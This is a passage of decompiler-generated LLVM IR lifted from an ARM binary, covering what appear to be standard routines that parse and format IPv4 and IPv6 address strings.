  br i1 %v2_15ce4, label %dec_label_pc_15cec, label %dec_label_pc_15d00

dec_label_pc_15cec:                               ; preds = %dec_label_pc_15ce4
  %v0_15cec = load i32, i32* %fp.global-to-local, align 4
  %v2_15cec = icmp eq i32 %v0_15cec, 0
  br i1 %v2_15cec, label %dec_label_pc_15cf4, label %dec_label_pc_15e08

dec_label_pc_15cf4:                               ; preds = %dec_label_pc_15cec
  %v0_15cf4 = load i32, i32* @r6, align 4
  store i32 %v0_15cf4, i32* %fp.global-to-local, align 4
  store i32 %v1_15cb8, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_15d6c.backedge

dec_label_pc_15d00:                               ; preds = %dec_label_pc_15ce4
  %v1_15d00 = inttoptr i32 %v1_15cb8 to i8*
  %v2_15d00 = load i8, i8* %v1_15d00, align 1
  %v3_15d00 = zext i8 %v2_15d00 to i32
  store i32 %v3_15d00, i32* %r3.global-to-local, align 4
  %v2_15d04 = icmp eq i8 %v2_15d00, 0
  br i1 %v2_15d04, label %dec_label_pc_15e08, label %dec_label_pc_15d0c

dec_label_pc_15d0c:                               ; preds = %dec_label_pc_15d00
  %v0_15d0c = load i32, i32* @r6, align 4
  %v1_15d0c = add i32 %v0_15d0c, 2
  store i32 %v1_15d0c, i32* %r3.global-to-local, align 4
  %v1_15d10 = load i32, i32* %r8.global-to-local, align 4
  %tmp37 = icmp ugt i32 %v1_15d0c, %v1_15d10
  br i1 %tmp37, label %dec_label_pc_15e08, label %dec_label_pc_15d18

dec_label_pc_15d18:                               ; preds = %dec_label_pc_15d0c
  %v0_15d18 = load i32, i32* @r7, align 4
  %v3_15d18 = udiv i32 %v0_15d18, 256
  store i32 %v3_15d18, i32* %r2.global-to-local, align 4
  store i32 %v0_15d0c, i32* %r3.global-to-local, align 4
  %v1_15d20 = trunc i32 %v3_15d18 to i8
  %v3_15d20 = inttoptr i32 %v0_15d0c to i8*
  store i8 %v1_15d20, i8* %v3_15d20, align 1
  %v4_15d20 = load i32, i32* %r3.global-to-local, align 4
  %v5_15d20 = add i32 %v4_15d20, 1
  store i32 %v5_15d20, i32* @r3, align 4
  %v0_15d24 = load i32, i32* @r7, align 4
  %v1_15d24 = trunc i32 %v0_15d24 to i8
  %v2_15d24 = load i32, i32* @r6, align 4
  %v3_15d24 = add i32 %v2_15d24, 1
  %v4_15d24 = inttoptr i32 %v3_15d24 to i8*
  store i8 %v1_15d24, i8* %v4_15d24, align 1
  store i32 0, i32* @r7, align 4
  %v0_15d2c = load i32, i32* @r3, align 4
  %v1_15d2c = add i32 %v0_15d2c, 1
  store i32 %v1_15d2c, i32* @r6, align 4
  %v0_15d30 = load i32, i32* @r5, align 4
  store i32 %v0_15d30, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_15d6c.backedge

dec_label_pc_15d3c:                               ; preds = %dec_label_pc_15cdc
  %v7_15d3c = icmp eq i32 %v0_15cdc, 46
  br i1 %v7_15d3c, label %dec_label_pc_15d44, label %dec_label_pc_15e08

dec_label_pc_15d44:                               ; preds = %dec_label_pc_15d3c
  %v0_15d44 = load i32, i32* @r6, align 4
  %v1_15d44 = add i32 %v0_15d44, 4
  store i32 %v1_15d44, i32* @r4, align 4
  %v1_15d48 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_15d44, %v1_15d48
  br i1 %tmp38, label %dec_label_pc_15e08, label %dec_label_pc_15d50

dec_label_pc_15d50:                               ; preds = %dec_label_pc_15d44
  %v0_15d50 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_15d50, i32* @r0, align 4
  store i32 %v0_15d44, i32* %r1.global-to-local, align 4
  %v3_15d58 = call i32 @function_15b4c(i32 %v0_15d50, i32 %v0_15d44)
  %v5_15d60 = icmp sgt i32 %v3_15d58, 0
  br i1 %v5_15d60, label %dec_label_pc_15d50.dec_label_pc_15da4_crit_edge, label %dec_label_pc_15e08

dec_label_pc_15d50.dec_label_pc_15da4_crit_edge:  ; preds = %dec_label_pc_15d50
  %v0_15de8.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15da4

dec_label_pc_15d68:                               ; preds = %dec_label_pc_15cc0
  store i32 1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_15d6c.backedge

dec_label_pc_15d6c.backedge:                      ; preds = %dec_label_pc_15d68, %dec_label_pc_15cf4, %dec_label_pc_15d18
  %v0_15d6c = phi i32 [ %v1_15cb8, %dec_label_pc_15d68 ], [ %v1_15cb8, %dec_label_pc_15cf4 ], [ %v0_15d30, %dec_label_pc_15d18 ]
  %v0_15d7812 = phi i32 [ 1, %dec_label_pc_15d68 ], [ 0, %dec_label_pc_15cf4 ], [ 0, %dec_label_pc_15d18 ]
  %v1_15d6c = inttoptr i32 %v0_15d6c to i8*
  %v2_15d6c = load i8, i8* %v1_15d6c, align 1
  %v3_15d6c = zext i8 %v2_15d6c to i32
  store i32 %v3_15d6c, i32* @r4, align 4
  %v2_15d70 = icmp eq i8 %v2_15d6c, 0
  br i1 %v2_15d70, label %dec_label_pc_15d78, label %dec_label_pc_15d6c.backedge.dec_label_pc_15ca8_crit_edge

dec_label_pc_15d6c.backedge.dec_label_pc_15ca8_crit_edge: ; preds = %dec_label_pc_15d6c.backedge
  %v2_15ca8.pre = load i8*, i8** %stack_var_-64, align 4
  br label %dec_label_pc_15ca8

dec_label_pc_15d78:                               ; preds = %dec_label_pc_15d6c.backedge
  %v0_15d7c.pre = load i32, i32* @r6, align 4
  %v2_15d78 = icmp eq i32 %v0_15d7812, 0
  store i32 %v0_15d7c.pre, i32* @r4, align 4
  br i1 %v2_15d78, label %dec_label_pc_15da4, label %dec_label_pc_15d84

dec_label_pc_15d84:                               ; preds = %dec_label_pc_15d78
  %v1_15d84 = add i32 %v0_15d7c.pre, 2
  store i32 %v1_15d84, i32* %r3.global-to-local, align 4
  %v1_15d88 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_15d84, %v1_15d88
  br i1 %tmp39, label %dec_label_pc_15e08, label %dec_label_pc_15d90

dec_label_pc_15d90:                               ; preds = %dec_label_pc_15d84
  store i32 %v0_15d7c.pre, i32* %r3.global-to-local, align 4
  %v0_15d94 = load i32, i32* @r7, align 4
  %v3_15d94 = udiv i32 %v0_15d94, 256
  store i32 %v3_15d94, i32* %r2.global-to-local, align 4
  %v1_15d98 = trunc i32 %v3_15d94 to i8
  %v3_15d98 = inttoptr i32 %v0_15d7c.pre to i8*
  store i8 %v1_15d98, i8* %v3_15d98, align 1
  %v4_15d98 = load i32, i32* %r3.global-to-local, align 4
  %v5_15d98 = add i32 %v4_15d98, 1
  store i32 %v5_15d98, i32* @r3, align 4
  %v0_15d9c = load i32, i32* @r7, align 4
  %v1_15d9c = trunc i32 %v0_15d9c to i8
  %v2_15d9c = load i32, i32* @r6, align 4
  %v3_15d9c = add i32 %v2_15d9c, 1
  %v4_15d9c = inttoptr i32 %v3_15d9c to i8*
  store i8 %v1_15d9c, i8* %v4_15d9c, align 1
  %v0_15da0 = load i32, i32* @r3, align 4
  %v1_15da0 = add i32 %v0_15da0, 1
  store i32 %v1_15da0, i32* @r4, align 4
  br label %dec_label_pc_15da4

dec_label_pc_15da4:                               ; preds = %dec_label_pc_15d50.dec_label_pc_15da4_crit_edge, %dec_label_pc_15d78.thread, %dec_label_pc_15d78, %dec_label_pc_15d90
  %v0_15de8.pre = phi i32 [ %v0_15de8.pre.pre, %dec_label_pc_15d50.dec_label_pc_15da4_crit_edge ], [ %v3_15c64, %dec_label_pc_15d78.thread ], [ %v0_15d7c.pre, %dec_label_pc_15d78 ], [ %v1_15da0, %dec_label_pc_15d90 ]
  %v0_15da4 = load i32, i32* %fp.global-to-local, align 4
  %v2_15da4 = icmp eq i32 %v0_15da4, 0
  %v1_15de8.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_15da4, label %dec_label_pc_15de8, label %dec_label_pc_15dac

dec_label_pc_15dac:                               ; preds = %dec_label_pc_15da4
  %v9_15dac = icmp eq i32 %v0_15de8.pre, %v1_15de8.pre
  %v2_15db0 = sub i32 %v0_15de8.pre, %v0_15da4
  store i32 %v2_15db0, i32* @ip, align 4
  br i1 %v9_15dac, label %dec_label_pc_15e08, label %dec_label_pc_15dd0.preheader

dec_label_pc_15dd0.preheader:                     ; preds = %dec_label_pc_15dac
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_15dd0

dec_label_pc_15dc4:                               ; preds = %dec_label_pc_15dd0
  %v2_15dd8 = sub i32 %v0_15de4, %v0_15ddc
  %v0_15dc4 = load i32, i32* %fp.global-to-local, align 4
  %v2_15dc4 = add i32 %v0_15dc4, %v2_15dd4
  %v3_15dc4 = inttoptr i32 %v2_15dc4 to i8*
  %v4_15dc4 = load i8, i8* %v3_15dc4, align 1
  %v6_15dc4 = zext i8 %v4_15dc4 to i32
  store i32 %v6_15dc4, i32* @r3, align 4
  %v3_15dc8 = inttoptr i32 %v2_15dd8 to i8*
  store i8 %v4_15dc4, i8* %v3_15dc8, align 1
  %v0_15dcc = load i32, i32* @lr, align 4
  %v1_15dcc = trunc i32 %v0_15dcc to i8
  %v2_15dcc = load i32, i32* %fp.global-to-local, align 4
  %v3_15dcc = load i32, i32* %r1.global-to-local, align 4
  %v4_15dcc = add i32 %v3_15dcc, %v2_15dcc
  %v5_15dcc = inttoptr i32 %v4_15dcc to i8*
  store i8 %v1_15dcc, i8* %v5_15dcc, align 1
  %v0_15dd0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15dd0.pre = load i32, i32* @ip, align 4
  %v1_15dd8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_15dd0

dec_label_pc_15dd0:                               ; preds = %dec_label_pc_15dd0.preheader, %dec_label_pc_15dc4
  %v0_15de4 = phi i32 [ %v1_15de8.pre, %dec_label_pc_15dd0.preheader ], [ %v1_15dd8.pre, %dec_label_pc_15dc4 ]
  %v1_15dd4 = phi i32 [ %v2_15db0, %dec_label_pc_15dd0.preheader ], [ %v1_15dd0.pre, %dec_label_pc_15dc4 ]
  %v0_15ddc = phi i32 [ 1, %dec_label_pc_15dd0.preheader ], [ %v0_15dd0.pre, %dec_label_pc_15dc4 ]
  %v2_15dd0 = sub i32 %v0_15ddc, %v1_15dd4
  %v4_15dd0 = xor i32 %v0_15ddc, %v1_15dd4
  %v5_15dd0 = xor i32 %v2_15dd0, %v0_15ddc
  %v6_15dd0 = and i32 %v5_15dd0, %v4_15dd0
  %v7_15dd0 = icmp slt i32 %v6_15dd0, 0
  %v8_15dd0 = icmp slt i32 %v2_15dd0, 0
  %v9_15dd0 = icmp eq i32 %v0_15ddc, %v1_15dd4
  %v2_15dd4 = sub i32 %v1_15dd4, %v0_15ddc
  store i32 %v2_15dd4, i32* %r1.global-to-local, align 4
  %v1_15ddc = add i32 %v0_15ddc, 1
  store i32 %v1_15ddc, i32* %r2.global-to-local, align 4
  %v3_15de0 = xor i1 %v8_15dd0, %v7_15dd0
  %v4_15de0 = or i1 %v9_15dd0, %v3_15de0
  br i1 %v4_15de0, label %dec_label_pc_15dc4, label %dec_label_pc_15de4

dec_label_pc_15de4:                               ; preds = %dec_label_pc_15dd0
  store i32 %v0_15de4, i32* @r4, align 4
  br label %dec_label_pc_15de8

dec_label_pc_15de8:                               ; preds = %dec_label_pc_15da4, %dec_label_pc_15de4
  %v0_15de8 = phi i32 [ %v0_15de4, %dec_label_pc_15de4 ], [ %v0_15de8.pre, %dec_label_pc_15da4 ]
  %v1_15de8 = phi i32 [ %v0_15de4, %dec_label_pc_15de4 ], [ %v1_15de8.pre, %dec_label_pc_15da4 ]
  %v9_15de8 = icmp eq i32 %v0_15de8, %v1_15de8
  br i1 %v9_15de8, label %dec_label_pc_15df0, label %dec_label_pc_15e08

dec_label_pc_15df0:                               ; preds = %dec_label_pc_15de8
  store i32 %arg3, i32* @r0, align 4
  store i32 %v2_15c58, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_15dfc = call i32 @function_f350()
  br label %dec_label_pc_15e20

dec_label_pc_15e08:                               ; preds = %dec_label_pc_15cc0, %dec_label_pc_15cec, %dec_label_pc_15d0c, %dec_label_pc_15d00, %dec_label_pc_15dac, %dec_label_pc_15d50, %dec_label_pc_15d3c, %dec_label_pc_15de8, %dec_label_pc_15c7c, %dec_label_pc_15d84, %dec_label_pc_15d44
  br label %dec_label_pc_15e20

dec_label_pc_15e10:                               ; preds = %dec_label_pc_15c3c
  %v0_15e10 = call i32 @function_ce08()
  store i32 97, i32* %r3.global-to-local, align 4
  %v2_15e18 = inttoptr i32 %v0_15e10 to i32*
  store i32 97, i32* %v2_15e18, align 4
  br label %dec_label_pc_15e20

dec_label_pc_15e20:                               ; preds = %dec_label_pc_15e08, %dec_label_pc_15df0, %dec_label_pc_15c48, %dec_label_pc_15e10
  %v1_15e28 = phi i32 [ 0, %dec_label_pc_15e08 ], [ 1, %dec_label_pc_15df0 ], [ %v3_15c50, %dec_label_pc_15c48 ], [ -1, %dec_label_pc_15e10 ]
  store i32 %v3_15c1c, i32* @r4, align 4
  store i32 %v6_15c1c, i32* @r5, align 4
  store i32 %v9_15c1c, i32* @r6, align 4
  store i32 %v12_15c1c, i32* @r7, align 4
  store i32 %v27_15c1c, i32* @lr, align 4
  ret i32 %v1_15e28

; uselistorder directives
  uselistorder i32 %v2_15dd4, { 1, 0 }
  uselistorder i32 %v2_15dd0, { 1, 0 }
  uselistorder i32 %v0_15ddc, { 2, 3, 6, 0, 1, 5, 4 }
  uselistorder i32 %v1_15dd4, { 1, 3, 0, 2 }
  uselistorder i32 %v0_15de4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_15de8.pre, { 0, 2, 1 }
  uselistorder i32 %v0_15de8.pre, { 2, 0, 1 }
  uselistorder i32 %v3_15d94, { 1, 0 }
  uselistorder i32 %v0_15d7c.pre, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_15d6c, { 1, 0 }
  uselistorder i32 %v0_15d44, { 1, 0, 2 }
  uselistorder i32 %v3_15d18, { 1, 0 }
  uselistorder i32 %v0_15d0c, { 1, 0, 2 }
  uselistorder i32 %v1_15cb8, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_15c94, { 1, 0 }
  uselistorder i8** %stack_var_-64, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 (i32, i32)* @function_15b4c, { 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_15e20, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_15e08, { 7, 4, 9, 5, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_15de8, { 1, 0 }
  uselistorder label %dec_label_pc_15dd0, { 1, 0 }
  uselistorder label %dec_label_pc_15da4, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_15d6c.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_15ca8, { 1, 0 }
}

define i32 @function_15e38(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15e38:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-57 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_15e38 = load i32, i32* @r4, align 4
  %v12_15e38 = load i32, i32* @r7, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-72, align 4
  store i32 0, i32* %stack_var_-57, align 4
  %v2_15f10 = ptrtoint i32* %stack_var_-40 to i32
  %v2_15ef0 = add i32 %v2_15f10, -17
  br label %dec_label_pc_15f10

dec_label_pc_15e60:                               ; preds = %dec_label_pc_15f10
  %v0_15e60 = load i32, i32* %fp.global-to-local, align 4
  %v2_15e60 = add i32 %v0_15e60, %v1_15e60
  %v3_15e60 = inttoptr i32 %v2_15e60 to i8*
  %v4_15e60 = load i8, i8* %v3_15e60, align 1
  %v6_15e60 = zext i8 %v4_15e60 to i32
  store i32 %v6_15e60, i32* @r4, align 4
  store i32 %v6_15e60, i32* @r0, align 4
  %v0_15e68 = call i32 @function_c960()
  store i32 %v0_15e68, i32* %r0.global-to-local, align 4
  %v1_15e6c = add i32 %v0_15e68, 48
  %v1_15e70 = trunc i32 %v1_15e6c to i8
  %v2_15e70 = load i32, i32* %r5.global-to-local, align 4
  %v3_15e70 = add i32 %v2_15e70, -17
  %v4_15e70 = inttoptr i32 %v3_15e70 to i8*
  store i8 %v1_15e70, i8* %v4_15e70, align 1
  %v0_15e74 = load i32, i32* %r5.global-to-local, align 4
  %v1_15e74 = add i32 %v0_15e74, -17
  %v2_15e74 = inttoptr i32 %v1_15e74 to i8*
  %v3_15e74 = load i8, i8* %v2_15e74, align 1
  %v0_15e78 = load i32, i32* %r6.global-to-local, align 4
  %v1_15e78 = add i32 %v0_15e78, 1
  store i32 %v1_15e78, i32* %r6.global-to-local, align 4
  store i32 %v2_15f10, i32* %r2.global-to-local, align 4
  %v7_15e80 = icmp eq i8 %v3_15e74, 48
  store i32 10, i32* @r1, align 4
  %v0_15e88 = load i32, i32* @r4, align 4
  store i32 %v0_15e88, i32* @r0, align 4
  %v2_15e8c = add i32 %v1_15e78, %v2_15f10
  store i32 %v2_15e8c, i32* %r8.global-to-local, align 4
  %v0_15e90 = load i32, i32* %fp.global-to-local, align 4
  %v1_15e90 = load i32, i32* %sl.global-to-local, align 4
  %v2_15e90 = add i32 %v1_15e90, %v0_15e90
  store i32 %v2_15e90, i32* %sb.global-to-local, align 4
  %v0_15e98 = call i32 @function_c960()
  %v1_15ea0 = urem i32 %v0_15e98, 256
  store i32 %v1_15ea0, i32* %r0.global-to-local, align 4
  %v2_15ea4 = call i32 @function_ca5c(i32 %v1_15ea0, i32 10)
  store i32 %v2_15ea4, i32* %r0.global-to-local, align 4
  br i1 %v7_15e80, label %dec_label_pc_15e98, label %dec_label_pc_15ec0

dec_label_pc_15e98:                               ; preds = %dec_label_pc_15e60
  %v1_15eb4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v1_15eb4, i32* @r7, align 4
  %v2_15eb8 = load i32, i32* %r5.global-to-local, align 4
  %v3_15eb8 = add i32 %v2_15eb8, -17
  %v4_15eb8 = inttoptr i32 %v3_15eb8 to i8*
  store i8 58, i8* %v4_15eb8, align 1
  br label %dec_label_pc_15edc

dec_label_pc_15ec0:                               ; preds = %dec_label_pc_15e60
  %v2_15ed4 = load i32, i32* %r8.global-to-local, align 4
  %v3_15ed4 = add i32 %v2_15ed4, -17
  %v4_15ed4 = inttoptr i32 %v3_15ed4 to i8*
  store i8 58, i8* %v4_15ed4, align 1
  %v0_15ed8 = load i32, i32* %r6.global-to-local, align 4
  %v1_15ed8 = add i32 %v0_15ed8, 1
  store i32 %v1_15ed8, i32* @r7, align 4
  br label %dec_label_pc_15edc

dec_label_pc_15edc:                               ; preds = %dec_label_pc_15e98, %dec_label_pc_15ec0
  %v0_15edc = load i32, i32* %sb.global-to-local, align 4
  %v1_15edc = inttoptr i32 %v0_15edc to i8*
  %v2_15edc = load i8, i8* %v1_15edc, align 1
  %v3_15edc = zext i8 %v2_15edc to i32
  store i32 %v3_15edc, i32* %r0.global-to-local, align 4
  %v2_15ee4 = call i32 @function_ca5c(i32 %v3_15edc, i32 10)
  store i32 %v2_15f10, i32* %ip.global-to-local, align 4
  %v0_15eec = load i32, i32* @r7, align 4
  %v1_15eec = add i32 %v0_15eec, 1
  store i32 %v1_15eec, i32* %r0.global-to-local, align 4
  %v3_15ef8 = add i32 %v2_15ef0, %v0_15eec
  %v4_15ef8 = inttoptr i32 %v3_15ef8 to i8*
  store i8 58, i8* %v4_15ef8, align 1
  %v0_15efc = load i32, i32* %ip.global-to-local, align 4
  %v1_15efc = load i32, i32* %r0.global-to-local, align 4
  %v2_15efc = add i32 %v1_15efc, %v0_15efc
  store i32 %v2_15efc, i32* %r2.global-to-local, align 4
  %v3_15f04 = add i32 %v2_15efc, -17
  %v4_15f04 = inttoptr i32 %v3_15f04 to i8*
  store i8 46, i8* %v4_15f04, align 1
  %v0_15f08 = load i32, i32* %r0.global-to-local, align 4
  %v1_15f08 = add i32 %v0_15f08, 1
  store i32 %v1_15f08, i32* %r6.global-to-local, align 4
  %v0_15f0c = load i32, i32* %sl.global-to-local, align 4
  %v1_15f0c = add i32 %v0_15f0c, 1
  store i32 %v1_15f0c, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_15f10

dec_label_pc_15f10:                               ; preds = %dec_label_pc_15e38, %dec_label_pc_15edc
  %v0_15f1c = phi i32 [ 0, %dec_label_pc_15e38 ], [ %v1_15f08, %dec_label_pc_15edc ]
  %v1_15e60 = phi i32 [ 0, %dec_label_pc_15e38 ], [ %v1_15f0c, %dec_label_pc_15edc ]
  store i32 %v2_15f10, i32* %ip.global-to-local, align 4
  store i32 100, i32* @r1, align 4
  store i32 %v0_15f1c, i32* @r7, align 4
  %v2_15f20 = add i32 %v0_15f1c, %v2_15f10
  store i32 %v2_15f20, i32* %r5.global-to-local, align 4
  %v7_15f24 = icmp sgt i32 %v1_15e60, 3
  br i1 %v7_15f24, label %dec_label_pc_15f28, label %dec_label_pc_15e60

dec_label_pc_15f28:                               ; preds = %dec_label_pc_15f10
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_15f2c = ptrtoint i32* %stack_var_-57 to i32
  %v3_15f30 = add i32 %v2_15f20, -18
  %v4_15f30 = inttoptr i32 %v3_15f30 to i8*
  store i8 0, i8* %v4_15f30, align 1
  store i32 %v2_15f2c, i32* @r0, align 4
  %v0_15f38 = call i32 @function_f2e0()
  store i32 %v0_15f38, i32* %r0.global-to-local, align 4
  %v2_15f3c = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_15f3c, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_15f38, %v2_15f3c
  br i1 %tmp, label %dec_label_pc_15f48, label %dec_label_pc_15f5c

dec_label_pc_15f48:                               ; preds = %dec_label_pc_15f28
  %v0_15f48 = call i32 @function_ce08()
  store i32 %v0_15f48, i32* %r0.global-to-local, align 4
  %v0_15f50 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_15f50, i32* %r2.global-to-local, align 4
  %v2_15f54 = inttoptr i32 %v0_15f48 to i32*
  store i32 28, i32* %v2_15f54, align 4
  %v0_15f6c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15f6c

dec_label_pc_15f5c:                               ; preds = %dec_label_pc_15f28
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_15f2c, i32* @r1, align 4
  %v2_15f64 = inttoptr i32 %arg2 to i8*
  %v3_15f64 = call i32 @function_f53c(i8* %v2_15f64, i32 %v2_15f2c)
  store i32 %v3_15f64, i32* %r0.global-to-local, align 4
  store i32 %v3_15f64, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15f6c

dec_label_pc_15f6c:                               ; preds = %dec_label_pc_15f48, %dec_label_pc_15f5c
  %v0_15f6c = phi i32 [ %v0_15f6c.pre, %dec_label_pc_15f48 ], [ %v3_15f64, %dec_label_pc_15f5c ]
  store i32 %v0_15f6c, i32* %r0.global-to-local, align 4
  store i32 %v3_15e38, i32* @r4, align 4
  store i32 %v12_15e38, i32* @r7, align 4
  ret i32 %v0_15f6c

; uselistorder directives
  uselistorder i32 %v0_15f6c, { 1, 0 }
  uselistorder i32 %v2_15f2c, { 1, 0, 2 }
  uselistorder i32 %v1_15e60, { 1, 0 }
  uselistorder i32 %v1_15ea0, { 1, 0 }
  uselistorder i32 %v2_15f10, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-57, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 8, 5, 6, 7, 9, 11, 10, 12, 0 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1 }
  uselistorder i32 100, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 (i32, i32)* @function_ca5c, { 9, 8, 6, 5, 4, 3, 2, 1, 7, 0 }
  uselistorder i8 48, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 ()* @function_c960, { 13, 12, 11, 9, 8, 7, 6, 5, 4, 10, 1, 3, 2, 0 }
  uselistorder i32 -17, { 2, 3, 4, 5, 6, 0, 7, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_15f6c, { 1, 0 }
  uselistorder label %dec_label_pc_15f10, { 1, 0 }
  uselistorder label %dec_label_pc_15edc, { 1, 0 }
}

define i32 @function_15f7c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15f7c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-118 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %v6_15f7c = load i32, i32* @r5, align 4
  %v7_15f88 = icmp eq i32 %arg1, 2
  store i1 %v7_15f88, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg4, i32* %stack_var_-128, align 4
  br i1 %v7_15f88, label %dec_label_pc_15fac, label %dec_label_pc_15fa0

dec_label_pc_15fa0:                               ; preds = %dec_label_pc_15f7c
  %v7_15fa0 = icmp eq i32 %arg1, 10
  store i1 %v7_15fa0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15fa0, label %dec_label_pc_15fc0, label %dec_label_pc_161d4

dec_label_pc_15fac:                               ; preds = %dec_label_pc_15f7c
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_15fb8 = call i32 @function_15e38(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_161cc

dec_label_pc_15fc0:                               ; preds = %dec_label_pc_15fa0
  %v2_15fc0 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_15fc0, i32* %r0.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_15fcc = bitcast i32* %stack_var_-72 to i8*
  %v3_15fcc = call i32 @function_f240(i8* %v2_15fcc, i32 0)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_15ff0 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_15fd4

dec_label_pc_15fd4:                               ; preds = %dec_label_pc_15fd4.dec_label_pc_15fd4_crit_edge, %dec_label_pc_15fc0
  %v0_15fec = phi i32 [ %v0_15fd4.pre, %dec_label_pc_15fd4.dec_label_pc_15fd4_crit_edge ], [ 0, %dec_label_pc_15fc0 ]
  %v1_15fd4 = load i32, i32* @r8, align 4
  %v2_15fd4 = add i32 %v1_15fd4, %v0_15fec
  %v3_15fd8 = inttoptr i32 %v2_15fd4 to i8*
  %v4_15fd8 = load i8, i8* %v3_15fd8, align 1
  %v6_15fd8 = zext i8 %v4_15fd8 to i32
  %v1_15fdc = add i32 %v2_15fd4, 1
  %v2_15fdc = inttoptr i32 %v1_15fdc to i8*
  %v3_15fdc = load i8, i8* %v2_15fdc, align 1
  %v4_15fdc = zext i8 %v3_15fdc to i32
  %tmp74 = icmp slt i32 %v0_15fec, 0
  %v4_15fe0 = zext i1 %tmp74 to i32
  %v5_15fe0 = add i32 %v4_15fe0, %v0_15fec
  %v4_15fe4 = mul nuw nsw i32 %v6_15fd8, 256
  %v5_15fe4 = or i32 %v4_15fdc, %v4_15fe4
  store i32 %v5_15fe4, i32* %r2.global-to-local, align 4
  %v3_15fe8 = sdiv i32 %v5_15fe0, 2
  %v1_15fec = add i32 %v0_15fec, 2
  store i32 %v1_15fec, i32* %r0.global-to-local, align 4
  %v4_15ff4 = mul i32 %v3_15fe8, 4
  %v5_15ff4 = add i32 %v4_15ff4, %v2_15ff0
  %v7_15ff8 = icmp eq i32 %v1_15fec, 15
  store i1 %v7_15ff8, i1* %cpsr_z.global-to-local, align 1
  %v2_15ffc = add i32 %v5_15ff4, -32
  %v3_15ffc = inttoptr i32 %v2_15ffc to i32*
